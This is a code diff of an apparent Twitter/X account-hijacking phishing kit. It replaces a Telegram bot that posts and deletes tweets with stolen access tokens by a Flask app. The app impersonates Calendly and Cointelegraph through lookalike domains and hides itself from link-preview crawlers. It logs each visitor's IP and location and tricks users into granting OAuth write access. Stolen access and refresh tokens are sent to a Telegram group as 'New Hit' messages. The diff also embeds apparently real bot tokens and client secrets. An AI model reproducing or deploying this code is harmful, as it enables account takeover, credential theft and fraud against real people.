@@ -1,240 +1,113 @@
+from flask import Flask, request, redirect
 import requests
-import urllib.parse
 import base64
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
-from keep_alive import keep_alive
-keep_alive()
 
-TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'
+app = Flask(__name__)
 
-TWITTER_CLIENT_ID = 'eWNUdkx4LTnaGQ0N3BaSGJyYkU6MTpjaQ'
-TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'
+TWITTER_CLIENT_ID = 'RzVZMktldWF5UC11RkJncXZDMXk6MTpjaQ' # Replace with your Twitter client ID
+TWITTER_CLIENT_SECRET = 'y5CHyncqgpfNy8KhNsCb6PF18dXEw3hdVbbp8MtxZCYdAV5vH8' # Replace with your Twitter client secret
 
+TELEGRAM_GROUP_CHAT_ID = '-1002338464220' # Replace with your Telegram group chat ID
+TELEGRAM_BOT_TOKEN = '8088705834:AAEQA9mEg6q8rzeIqKyhRZ7NgXzgmYl_1ds' # Replace with your Telegram bot token
 
-async def start(update: Update, context: CallbackContext) -> None:
-    await update.message.reply_text('Welcome to the Twitter Logger')
+credentials = f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}"
+credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')
 
+@app.route('/cointelegraph') # Examples: cointelegraph, decryptmedia, etc
+def index():
+    user_agent = request.headers.get('User-Agent')
 
-async def tweet(update: Update, context: CallbackContext) -> None:
-    args = context.args
-    if len(args) < 2:
-        await update.message.reply_text(
-            'Usage: /post_tweet {accessToken} {text}')
-        return
+    if user_agent is None:
+        user_agent = ''
 
-    access_token = args[0]
-    tweet_text = ' '.join(arg.strip()
-                          for arg in args[1:]).replace('\\\\n', '\n')
+    user_agent = user_agent.strip('\r\n')
 
-    group_name = update.message.chat.title
-    print(f"({group_name}) tweeted: {tweet_text} [{access_token}]\n")
-
-    tweet_url = 'https://api.twitter.com/2/tweets'
-    user_lookup_url = 'https://api.twitter.com/2/users/me'
-    upload_media_url = 'https://upload.twitter.com/1.1/media/upload.json?media_category=tweet_image'
-
-    headers = {
-        'Authorization': f'Bearer {access_token}',
-        'Content-Type': 'application/json'
-    }
-
-    response = requests.get(user_lookup_url, headers=headers)
-    response_data = response.json()
-
-    username = response_data['data']['username']
-
-    tweet_data = {'text': tweet_text, 'reply_settings': "mentionedUsers"}
-    response = requests.post(tweet_url, json=tweet_data, headers=headers)
-    response_data = response.json()
-
-    tweetId = response_data['data']['id']
-    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id
-
-    if response.status_code == 201:
-        await context.bot.send_message(
-            chat_id=chatId,
-            text=
-            f'✅ *Tweet Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
-            parse_mode='MarkDown')
+    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
+        return redirect('https://calendly.com/cointele')
     else:
-        await context.bot.send_message(
-            chat_id=chatId,
-            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')
-
-
-async def reply(update: Update, context: CallbackContext) -> None:
-    args = context.args
-    if len(args) < 3:
-        await update.message.reply_text(
-            'Usage: /post_reply {accessToken} {tweetId} {text}')
-        return
-
-    access_token = args[0]
-    tweet_id = args[1]
-    tweet_text = ' '.join(arg.strip()
-                          for arg in args[2:]).replace('\\\\n', '\n')
-
-    tweet_url = 'https://api.twitter.com/2/tweets'
-    user_lookup_url = 'https://api.twitter.com/2/users/me'
-
-    headers = {
-        'Authorization': f'Bearer {access_token}',
-        'Content-Type': 'application/json'
-    }
-
-    response = requests.get(user_lookup_url, headers=headers)
-    response_data = response.json()
-
-    username = response_data['data']['username']
-
-    tweet_data = {
-        'text': tweet_text,
-        'reply': {
-            'in_reply_to_tweet_id': tweet_id,
-        }
-    }
-    response = requests.post(tweet_url, json=tweet_data, headers=headers)
-    response_data = response.json()
-
-    tweetId = response_data['data']['id']
-    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id
-
-    if response.status_code == 201:
-        await context.bot.send_message(
-            chat_id=chatId,
-            text=
-            f'✅ *Reply Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
-            parse_mode='MarkDown')
-    else:
-        await context.bot.send_message(
-            chat_id=chatId,
-            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')
-
-
-async def refresh(update: Update, context: CallbackContext) -> None:
-    args = context.args
-    if len(args) < 1:
-        await update.message.reply_text('Usage: /refresh {refreshToken}')
-        return
-
-    refresh_token = args[0]
-    token_refresh_URL = 'https://api.twitter.com/2/oauth2/token'
-    headers = {
-        'Authorization':
-        'Basic ' + base64.b64encode(
-            f'{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}'.encode()).decode(),
-        'Content-Type':
-        'application/x-www-form-urlencoded'
-    }
-    request_data = {
-        'grant_type': 'refresh_token',
-        'refresh_token': refresh_token
-    }
-
-    try:
-        response = requests.post(token_refresh_URL,
-                                 data=urllib.parse.urlencode(request_data),
-                                 headers=headers)
-        response_data = response.json()
-        
-
-        new_access_token = response_data['access_token']
-        new_refresh_token = response_data['refresh_token']
-
-        user_lookup_url = 'https://api.twitter.com/2/users/me'
-
-        headers = {
-            'Authorization': f'Bearer {new_access_token}',
-            'Content-Type': 'application/json'
-        }
-
-        response = requests.get(user_lookup_url, headers=headers)
-        response_data2 = response.json()
-        
-
-        username = response_data2['data']['username']
-
-        chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id
-        print(f"({update.message.chat.title}) refreshed: (Access Token: {new_access_token}) (Refresh Token: {new_refresh_token}) [@{username if username else 'error'}]\n")
-
-        if response.status_code == 200:
-            await context.bot.send_message(
-                chat_id=chatId,
-                text=
-                f'🔄 *Token Refreshed* 🔄\n\n👤 Account:\nx.com/{username}\n\n🔑 Access Token:\n`{new_access_token}`\n\n🔄 Refresh Token:\n`{new_refresh_token}`',
-                parse_mode='MarkDown')
+        if 'X-Forwarded-For' in request.headers:
+            real_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
         else:
-            await update.message.reply_text(
-                f'🚫 *Refresh Failed* 🚫\nError: {response_data["error_description"]}',
-                parse_mode='MarkDown')
-    except Exception as e:
-        await update.message.reply_text(
-            f'🚫 *Refresh Failed* 🚫\nError: {str(e)}')
+            real_ip = request.remote_add
+
+        res = requests.get(f'http://ip-api.com/json/{real_ip}')
+        data = res.json()
+
+        country = data["country"]
+        country_code = data["countryCode"]
+        city = data["city"]
+
+        code_points = [ord(char) + 127397 for char in country_code]
+        country_flag = ''.join(chr(code_point) for code_point in code_points)
+
+        message = f'🔗 Connection: {real_ip}\n\n{country_flag} {city}, {country}'
+
+        requests.post(
+            f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
+            data={
+                'chat_id': TELEGRAM_GROUP_CHAT_ID,
+                'text': message
+            }
+        )
+
+        TWITTER_CALLBACK_URL = 'https://callendly.pythonanywhere.com/auth' # Example: /auth, /callback, /authorize
+        twitter_oauth_url = f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}&redirect_uri={TWITTER_CALLBACK_URL}&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write&state=state&code_challenge=challenge&code_challenge_method=plain'
+        return redirect(twitter_oauth_url)
 
 
-async def delete(update: Update, context: CallbackContext) -> None:
-    args = context.args
-    if len(args) < 2:
-        await update.message.reply_text(
-            'Usage: /delete_tweet {accessToken} {id}')
-        return
+@app.route('/auth') # Examples: auth, callback, authorize
+def callback():
+    authorization_code = request.args.get('code')
 
-    access_token = args[0]
-    tweetId = args[1]
+    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
+    user_lookup_url = 'https://api.twitter.com/2/users/me'
 
-    delete_url = f'https://api.twitter.com/2/tweets/{tweetId}'
+    request_data = {
+        'grant_type': 'authorization_code',
+        'code': authorization_code,
+        'redirect_uri': 'https://callendly.pythonanywhere.com/auth', # Example: https://your-name.pythonanywhere.com/your-redirect
+        'code_verifier': "challenge"
+    }
+
+    headers = {
+        'Authorization': f'Basic {credentials_base64}',
+        'Content-Type': 'application/x-www-form-urlencoded',
+    }
+
+    response = requests.post(token_exchange_url,
+                             data=request_data,
+                             headers=headers)
+    response_data = response.json()
+    print(response_data)
+
+    access_token = response_data['access_token']
+    refresh_token = response_data['refresh_token']
+
     headers = {
         'Authorization': f'Bearer {access_token}',
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
     }
-    response = requests.delete(delete_url, headers=headers)
+
+    response = requests.get(user_lookup_url,
+                             headers=headers)
     response_data = response.json()
 
-    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id
+    username = response_data['data']['username']
 
-    if response.status_code == 200:
-        await context.bot.send_message(chat_id=chatId,
-                                       text='❌ Tweet Deleted ❌')
-    else:
-        print(response_data)
-        await update.message.reply_text(
-            f'🚫 Deletion Failed 🚫\nError: {response_data["title"]}')
+    send_to_telegram(username, access_token, refresh_token, TELEGRAM_GROUP_CHAT_ID)
 
-async def links(update: Update, context: CallbackContext) -> None:
-    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
-    links = []
-    ls = []
-    if group_id == -4146400715:
-        ls = ['https://www\.calendlly\.xyz/coingecko/invitation', 'https://www\.calendlly\.xyz/coinmarketcap/invitation', 'https://www\.calendlly\.xyz/bitcoinmagazine/invitation']
-    elif group_id == -4148855237:
-        ls = ['https://www\.cointele\.site/cointelegraph/meeting\-hour?month\=2024\-07']
-    elif group_id == -4537180005:
-        ls = ['https://callendly\.pythonanywhere\.com/cointelegraph']
+    return redirect("https://calendly.com/cointele/45min?back=1&month=2024-08", code=302)
 
-    print(f"({update.message.chat.title}) retrieved links: [{'] ['.join(ls) if ls else 'None :('}]")
-    for link in ls:
-        link = f'> 🔗 {link}'
-        links.append(link)
-    nl = '\n'
-    list = nl.join(links)
-    await context.bot.send_message(chat_id=group_id, text=f"🔗 *Links* 🔗\n\n{list if links else '> Nothing to see here 👀'}", parse_mode='MarkdownV2')
+def send_to_telegram(username: str, access_token: str, refresh_token: str, group_id) -> None:
+    message: str = f'⚠️ *New Hit* ⚠️\n\nx.com/{username}\n\n🔑 Access Token:\n`{access_token}`\n\n🔄 Refresh Token:\n`{refresh_token}`'
 
-async def id(update: Update, context: CallbackContext) -> None:
-    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
-    await context.bot.send_message(chat_id=group_id, text=f"🆔 *Group ID* 🆔\n\n`{group_id}`", parse_mode='MarkDown')
-
-def main() -> None:
-    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("post_tweet", tweet))
-    app.add_handler(CommandHandler("post_reply", reply))
-    app.add_handler(CommandHandler("refresh", refresh))
-    app.add_handler(CommandHandler("delete_tweet", delete))
-    app.add_handler(CommandHandler("links", links))
-    app.add_handler(CommandHandler("id", id))
-    app.run_polling(poll_interval=5)
-
+    requests.post(
+        f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
+        data={
+            'chat_id': group_id,
+            'text': message,
+            'parse_mode': 'MarkDown'
+        })
 
 if __name__ == '__main__':
-    main()
+  app.run()
